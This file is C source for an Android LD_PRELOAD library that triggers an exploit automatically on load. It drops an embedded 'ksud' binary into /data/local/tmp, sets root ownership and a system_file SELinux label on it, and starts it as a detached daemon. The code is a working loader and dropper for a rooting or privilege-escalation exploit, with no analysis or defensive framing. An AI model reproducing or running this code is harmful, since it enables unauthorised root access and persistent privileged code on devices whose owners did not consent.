#include "common.h"

extern const unsigned char embedded_ksud_start[];
extern const unsigned char embedded_ksud_end[];

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static void try_chcon(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
          path, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
}

static int write_embedded_ksud_file(const char *dir, const char *dst) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.ksud.new.%d", dir, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_ksud_end - embedded_ksud_start);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    return 0;
  }
  int ok = write_full(fd, embedded_ksud_start, size);
  int saved_errno = errno;
  if (ok) {
    ok = fchown(fd, 0, 0) == 0 && fchmod(fd, 0755) == 0;
    saved_errno = errno;
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  try_chcon(tmp);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  try_chcon(dst);
  pr_success("embedded ksud wrote %zu bytes to %s\n", size, dst);
  return 1;
}

static pid_t start_ksud_late_load(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 65536) {
      max_fd = 65536;
    }
    for (int fd = STDERR_FILENO + 1; fd < max_fd; fd++) {
      close(fd);
    }
    execl(path, "ksud", "--daemon", (char *)NULL);
    _exit(127);
  }
  return pid;
}

int install_embedded_ksud(void) {
  if (!write_embedded_ksud_file("/data/local/tmp", "/data/local/tmp/ksud")) {
    return 0;
  }

  pid_t pid = start_ksud_late_load("/data/local/tmp/ksud");
  if (pid <= 0) {
    return 0;
  }

  pr_success("embedded ksud daemon started pid=%d path=/data/local/tmp/ksud\n", pid);
  return 1;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  unsetenv("LD_PRELOAD");

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
